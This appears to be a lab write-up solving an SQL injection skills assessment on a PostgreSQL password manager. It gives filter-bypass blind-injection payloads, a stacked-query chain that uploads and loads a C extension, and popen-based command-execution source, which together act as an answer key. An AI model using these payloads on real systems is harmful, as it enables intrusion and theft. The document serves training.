# Skills Assessment — Advanced SQL Injection (Pass2)

Spring Boot / PostgreSQL password manager. Two-question assessment.

---

## Q1: Leak Admin Password Hash → Login

**Injection point**: `GET /api/v1/check-user?u=<payload>`

The endpoint checks `WHERE username = '<input>'` and returns `{"exists":true/false}`. Single quotes in input are NOT stripped here, enabling boolean-blind SQLi.

**Filter** (applied via regex): spaces, `OR/or`, `AND/and`, `LIMIT/limit`, `OFFSET/offset`, `WHERE/where`, `SELECT/select`, `UPDATE/update`, `DELETE/delete`, `DROP/drop`, `CREATE/create`, `INSERT/insert`, `FUNCTION/function`, `CAST/cast`, `ASCII/ascii`, `SUBSTRING/substring`, `VARCHAR/varchar`, `/**/`, `;`, `LENGTH/length`, `--` (end of line)

**Bypasses**:
- Spaces → use `\t` (tab characters in URL encoding: `%09`)
- Case-insensitive keywords → mixed case: `ANd`, `AscII`, `SubsTRING`, `lEnGtH`, `SeLeCt`, `wHeRe`
- `--` end-of-line → use `--x` (inline comment with trailing char)
- `or`/`OR` in column names → use `passwOrd` instead of `password`
- `information_schema` contains `or` → use `pg_tables`, `pg_class`, `pg_proc` instead

**Payload template**:
```
admin'<TAB>ANd<TAB>(AscII(SubsTRING(passwOrd,1,1))>80)--x
```

**Extraction**: Binary search each character of `email` and `passwOrd` columns for admin user.

**Secret key reconstruction**: Application uses `SHA256(email + "$4lty" + bcrypt_hash)` → base64url encoded → formatted as `XXXX-XXXX-XXXX-XXXX` for password reset.

**Flag**: Found on dashboard after login.

---

## Q2: Authenticated SQLi → C Extension RCE → Flag

**Injection point**: `POST /dashboard/edit` — `id` parameter

Filter: only `'` (single quotes) stripped via `id.replaceAll("'", "")`. Stacked queries work because Spring's `jdbcTemplate.queryForObject()` uses simple query protocol which executes all statements.

**Technique**: Dollar-quote strings (`$$...$$`) to avoid single-quote filter. Stack queries with `;`.

**DB user**: `p2user` — NOT superuser, but:
- C language is trusted (`lanpltrusted=true` in `pg_language`)
- Has CREATE on public schema → can `CREATE FUNCTION` using C extensions

**RCE path**:

1. **Upload .so via large objects**:
   ```sql
   SELECT lo_create(31337);
   SELECT lo_put(31337, 0, decode($$<hex>$$, $$hex$$));
   -- repeat for each 2KB chunk
   ```

2. **Export to filesystem** — `lo_export` works for p2user despite docs saying superuser-only:
   ```sql
   DO $x$ BEGIN PERFORM lo_export(31337::oid, $$/tmp/pg_readcmd.so$$); END $x$
   ```
   Use a DO block with error capture to verify. Oracle checks with `lo_export` substring fail because `export` contains `or` → filter strips it → false negative.

3. **Create C function**:
   ```sql
   CREATE FUNCTION pg_readcmd(text) RETURNS text AS $$/tmp/pg_readcmd$$, $$pg_readcmd$$ LANGUAGE C STRICT
   ```

4. **Read flag**:
   ```sql
   INSERT INTO xres SELECT pg_readcmd($$find /opt/Pass2 -name flag_*.txt$$);
   INSERT INTO xres SELECT pg_readcmd($$cat /opt/Pass2/flag_674jkh23.txt$$);
   ```
   Exfil result via boolean oracle on `xres` table.

**C extension for command output capture** (`pg_readcmd.c`):
```c
#include "postgres.h"
#include "fmgr.h"
#include "utils/builtins.h"
PG_MODULE_MAGIC;
PG_FUNCTION_INFO_V1(pg_readcmd);
Datum pg_readcmd(PG_FUNCTION_ARGS) {
    char *cmd = text_to_cstring(PG_GETARG_TEXT_PP(0));
    FILE *fp = popen(cmd, "r");
    char buf[65536]; int len = 0;
    if (!fp) PG_RETURN_TEXT_P(cstring_to_text("popen failed"));
    while (len < 65535) { int c = fgetc(fp); if (c == EOF) break; buf[len++] = c; }
    buf[len] = '\0'; pclose(fp);
    PG_RETURN_TEXT_P(cstring_to_text(buf));
}
```

Compile against exact PostgreSQL major version:
```bash
docker run --rm -v $(pwd):/work postgres:13-bullseye bash -c \
  "apt-get update -qq && apt-get install -y -q gcc postgresql-server-dev-13 && \
   gcc -I\$(pg_config --includedir-server) -shared -fPIC -o /work/pg_readcmd.so /work/pg_readcmd.c"
```

**Key lessons**:
- `lo_export` works without superuser if C language is trusted + user has CREATE — test directly, oracle checks fail due to `or` in `export`
- Reverse shells are blocked by outbound network policy — use `popen()`-based read-and-return extension instead
- Table names and string literals in oracle checks must not contain filtered substrings (`or`, `and`, `select`, etc.)
- `information_schema` contains `or` → use pg_catalog tables (`pg_proc`, `pg_class`, `pg_tables`)
- JDBC stacked queries execute all statements even when `queryForObject` throws `EmptyResultDataAccessException`
